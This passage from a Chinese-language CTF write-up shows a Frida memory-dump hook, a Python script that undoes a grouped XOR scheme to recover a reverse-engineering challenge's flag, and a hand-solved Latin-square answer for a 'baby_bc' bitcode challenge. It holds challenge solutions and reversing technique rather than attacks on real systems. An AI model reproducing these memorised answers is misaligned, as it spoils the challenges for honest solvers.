        onLeave: function(retval){
           console.log("ret->",hexdump(addr));
        }
    });
   
}
setTimeout(hook,1000)
```

之后发现每三个为一组 互相xor,之后与“12345678”xor

写出exp

```python
input1 = b"123456789012345678901234567890123456789"
xor1   = b"\x8a\xc1\x0a\xe0\x3c\x87\xe9\x9f\xc9\x03\x3b\xfd\x95\x09\x3d\x93\x45\xa6\xa4\x79\xf8\x5a\x4e\x81\x6c\x2d\xe2\x8f\x60\x9d\xd2\x5c\x8a\xb3\x4f\x50\xa7\x39\x2e"
xor2 = []
for i in range(39):
    xor2.append(xor1[i] ^ input1[i])
key = b"12345678"
result1 = [0xA3, 0x1A, 0xE3, 0x69, 0x2F, 0xBB, 0x1A, 0x84, 0x65, 0xC2, 
  0xAD, 0xAD, 0x9E, 0x96, 0x05, 0x02, 0x1F, 0x8E, 0x36, 0x4F, 
  0xE1, 0xEB, 0xAF, 0xF0, 0xEA, 0xC4, 0xA8, 0x2D, 0x42, 0xC7, 
  0x6E, 0x3F, 0xB0, 0xD3, 0xCC, 0x78, 0xF9, 0x98, 0x3F]
result = b""
for i in range(len(result1)):
    result += result1[i].to_bytes(1, byteorder='big')
    print(hex(result[i]))

key+=key
key+=key
key+=key
key+=key
result2 =[]
for i in range(39):
   result2.append(result[i] ^ key[i])
for i in range(0,39,3):
    result2[i+1] ^= result2[i]
    result2[i+2] ^= result2[i+1]
    result2[i] ^= result2[i+2]
for i in range(39):
    result2[i] ^= xor2[i]
print("".join(chr(result2[i]) for i in range(39)))
```

### baby_bc

`clang baby.bc -o baby`

ida分析，5x5的矩阵，每行每列各不相同，只能填12345 里面被填了的地方写0 a  [3] [3]=4 a [4] [4] = 3, 还有一些 > 

<的约束条件 ，不会写算法，手撸

```
14253
53142
35421
21534
42315
```

再替换0 1425353142350212150442315 md5就好了

## Misc

从来不做Misc